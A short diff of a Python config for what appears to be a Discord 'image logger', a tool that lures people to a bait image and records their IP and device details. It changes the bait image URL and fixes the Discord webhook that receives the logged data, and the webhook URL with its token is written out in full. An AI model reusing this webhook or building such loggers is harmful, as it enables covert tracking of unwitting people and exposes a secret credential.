@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https:https://discord.com/api/webhooks/1335776384349638686/mYmcf-vEe1iR5z4r0WrSb0-x61Eid38_wSfgX41fxZwhldzLZpDoF11Sz8iaw2v7iRiD,
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fsoundcloud.com%2Fthriplerex%2Frick-astley-never-gonna-give-you-up-ultrasymphonic-orchestral-arrangement&psig=AOvVaw1hHYBIiN2shWe5HLYjfO6y&ust=1738630863560000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCLCc4-mmposDFQAAAAAdAAAAABAE
+    "webhook": "https://discord.com/api/webhooks/1335776384349638686/mYmcf-vEe1iR5z4r0WrSb0-x61Eid38_wSfgX41fxZwhldzLZpDoF11Sz8iaw2v7iRiD"
+    "image": "https://images-ext-1.discordapp.net/external/CqyF8ky38bXUZekjnk2_rT9vIBwwG5MkxN2uVClSs8E/https/cdn.businessinsider.es/sites/navi.axelspringer.es/public/media/image/2021/02/bi-2238511.jpg?format=webp&width=988&height=741"
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
